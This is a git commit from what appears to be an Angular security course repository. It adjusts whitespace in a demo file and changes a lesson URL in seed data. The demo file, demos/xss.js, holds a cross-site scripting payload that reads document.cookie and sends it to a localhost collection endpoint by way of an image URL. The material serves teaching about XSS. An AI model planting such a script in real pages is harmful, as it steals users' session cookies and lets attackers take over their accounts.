195830033fa7ea197dece2367741040d4d8f1f98
JHades <jhades.dev@gmail.com>
2017-09-11 15:09:20 +0200

    Angular Security course

--- demos/xss.js
+++ demos/xss.js
@@ -1,9 +1,12 @@
 
 
-
 var cookies = document.cookie;
 
 var logo = document.getElementById("logo");
 
 logo.src = 'http://localhost:9090/img/xss?userCookies=' + cookies;
+
+
+
+
 
--- server/database-data.ts
+++ server/database-data.ts
@@ -9,7 +9,7 @@ export const LESSONS = {
         "longDescription": `<p>This is step by step guide to create your <b>first  application</b>. <b>Its aimed at beginners</b> just starting out with the framework.This lesson will show how to create a component, and how to link the component to a <i>given custom HTML tag</i>. It will show how to give the component a given template.</p>`,
         "tags": "BEGINNER",
         "duration": "4:17",
-        "url": "https://www.youtube.com/watch?v=LVrF-aQ6NxQ",
+        "url": "beginners",
         "videoUrl": "https://www.youtube.com/embed/du6sKwEFrhQ"
     },
     2: {
